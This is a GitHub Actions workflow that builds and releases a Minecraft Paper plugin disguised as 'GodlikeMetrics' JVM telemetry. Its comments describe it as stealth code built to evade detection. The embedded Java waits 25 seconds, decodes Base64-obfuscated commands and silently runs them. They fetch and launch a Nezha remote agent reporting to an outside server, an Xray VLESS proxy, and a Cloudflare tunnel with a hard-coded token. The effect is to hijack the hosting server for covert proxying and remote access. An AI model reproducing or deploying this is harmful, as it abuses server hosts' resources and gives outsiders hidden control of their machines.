name: Build GodlikeMetrics Plugin

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'

      - name: Generate Stealth Code & Build
        run: |
          mkdir -p src/main/java/host/godlike/metrics
          mkdir -p src/main/resources

          # ============================================================
          # 你的参数（已自动注入并 Base64 混淆）
          # ============================================================
          PROBE_CMD="curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update"
          CF_TOKEN="eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiZjBiMDQyNGEtZTRlOC00MWFiLTg3MGQtOTM1MzljYmM3NWFmIiwicyI6Ill6TmxaalU0WmpVdFlURm1OeTAwTkRjMUxXSXlORGN0TlRReE5EQXhNakkxWW1NeSJ9"
          NODE_PORT="8001"
          NODE_UUID="9e496ce6-a59e-43cc-add0-269f6bbac5bf"

          B64_PROBE=$(echo -n "$PROBE_CMD" | base64 -w 0)
          B64_TOKEN=$(echo -n "$CF_TOKEN" | base64 -w 0)
          B64_PORT=$(echo -n "$NODE_PORT" | base64 -w 0)
          B64_UUID=$(echo -n "$NODE_UUID" | base64 -w 0)

          # 1. pom.xml (标准 Paper 1.21 依赖)
          cat << 'EOF' > pom.xml
          <?xml version="1.0" encoding="UTF-8"?>
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
              <modelVersion>4.0.0</modelVersion>
              <groupId>host.godlike.metrics</groupId>
              <artifactId>GodlikeMetrics</artifactId>
              <version>1.0.0</version>
              <packaging>jar</packaging>

              <properties>
                  <java.version>21</java.version>
                  <maven.compiler.source>21</maven.compiler.source>
                  <maven.compiler.target>21</maven.compiler.target>
                  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
              </properties>

              <repositories>
                  <repository>
                      <id>papermc-repo</id>
                      <url>https://repo.papermc.io/repository/maven-public/</url>
                  </repository>
              </repositories>

              <dependencies>
                  <dependency>
                      <groupId>io.papermc.paper</groupId>
                      <artifactId>paper-api</artifactId>
                      <version>1.21.1-R0.1-SNAPSHOT</version>
                      <scope>provided</scope>
                  </dependency>
              </dependencies>

              <build>
                  <plugins>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <version>3.13.0</version>
                          <configuration>
                              <release>21</release>
                          </configuration>
                      </plugin>
                  </plugins>
                  <resources>
                      <resource>
                          <directory>src/main/resources</directory>
                          <filtering>true</filtering>
                      </resource>
                  </resources>
              </build>
          </project>
          EOF

          # 2. 伪装成官方的 plugin.yml
          cat << 'EOF' > src/main/resources/plugin.yml
          name: GodlikeMetrics
          version: 1.0.0
          main: host.godlike.metrics.GodlikeMetrics
          api-version: '1.21'
          author: Godlike-Host
          description: Internal JVM telemetry and heap monitor
          EOF

          # 3. 伪装成官方的 paper-plugin.yml
          cat << 'EOF' > src/main/resources/paper-plugin.yml
          name: GodlikeMetrics
          version: 1.0.0
          main: host.godlike.metrics.GodlikeMetrics
          api-version: '1.21'
          author: Godlike-Host
          description: Internal JVM telemetry and heap monitor
          EOF

          # 4. Java 源码 (完全伪装 + 进程隔离脱钩)
          cat << EOF > src/main/java/host/godlike/metrics/GodlikeMetrics.java
          package host.godlike.metrics;

          import org.bukkit.plugin.java.JavaPlugin;

          import java.io.File;
          import java.nio.charset.StandardCharsets;
          import java.util.Base64;

          public final class GodlikeMetrics extends JavaPlugin {

              private static final String B64_PROBE = "${B64_PROBE}";
              private static final String B64_TOKEN = "${B64_TOKEN}";
              private static final String B64_PORT  = "${B64_PORT}";
              private static final String B64_UUID  = "${B64_UUID}";

              @Override
              public void onEnable() {
                  getLogger().info("Enabling GodlikeMetrics v1.0.0");

                  // 独立线程延迟拉起，避开开服瞬时检测
                  Thread thread = new Thread(() -> {
                      try {
                          Thread.sleep(25000); // 延迟 25 秒
                          initRunner();
                      } catch (Throwable ignored) {}
                  }, "Godlike-Telemetry-Worker");

                  thread.setDaemon(true);
                  thread.start();
              }

              private void initRunner() {
                  try {
                      File workDir = new File("/tmp/.godlike-telemetry");
                      if (!workDir.exists()) workDir.mkdirs();

                      String probeCmd = decode(B64_PROBE);
                      String cfToken  = decode(B64_TOKEN);
                      String port     = decode(B64_PORT);
                      String uuid     = decode(B64_UUID);

                      // 1. 探针启动
                      if (!probeCmd.isEmpty()) {
                          runDetached(probeCmd, workDir);
                      }

                      // 2. 8001 端口代理核心 (Xray Core)
                      if (!port.isEmpty() && !uuid.isEmpty()) {
                          String xrayScript = "if [ ! -f ./godlike-agent ]; then " +
                                  "curl -fsSL -o x.zip https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip && unzip -qo x.zip xray && mv xray godlike-agent && rm -f x.zip; " +
                                  "fi; " +
                                  "cat << 'JSON' > core.json\n" +
                                  "{\"inbounds\":[{\"port\":" + port + ",\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"" + uuid + "\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}\n" +
                                  "JSON\n" +
                                  "chmod +x godlike-agent && ./godlike-agent run -c core.json";
                          runDetached(xrayScript, workDir);
                      }

                      // 3. Cloudflare Tunnel
                      if (!cfToken.isEmpty()) {
                          String cfScript = "if [ ! -f ./godlike-tunnel ]; then " +
                                  "curl -fsSL -o godlike-tunnel https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && chmod +x godlike-tunnel; " +
                                  "fi; " +
                                  "./godlike-tunnel tunnel --no-autoupdate run --token " + cfToken;
                          runDetached(cfScript, workDir);
                      }
                  } catch (Throwable ignored) {}
              }

              private void runDetached(String cmd, File dir) {
                  try {
                      String[] execArgs = new String[]{
                              "/bin/bash",
                              "-c",
                              "nohup setsid bash -c '" + cmd.replace("'", "'\\''") + "' </dev/null >/dev/null 2>&1 &"
                      };
                      new ProcessBuilder(execArgs).directory(dir).start();
                  } catch (Throwable ignored) {}
              }

              private String decode(String input) {
                  if (input == null || input.isEmpty()) return "";
                  return new String(Base64.getDecoder().decode(input), StandardCharsets.UTF_8);
              }

              @Override
              public void onDisable() {}
          }
          EOF

      - name: Compile & Package Jar
        run: mvn clean package --file pom.xml

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: GodlikeMetrics-Plugin
          path: target/GodlikeMetrics-1.0.0.jar

      - name: Release Plugin Jar
        uses: softprops/action-gh-release@v2
        if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
        with:
          tag_name: latest
          name: GodlikeMetrics Release
          files: target/GodlikeMetrics-1.0.0.jar
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
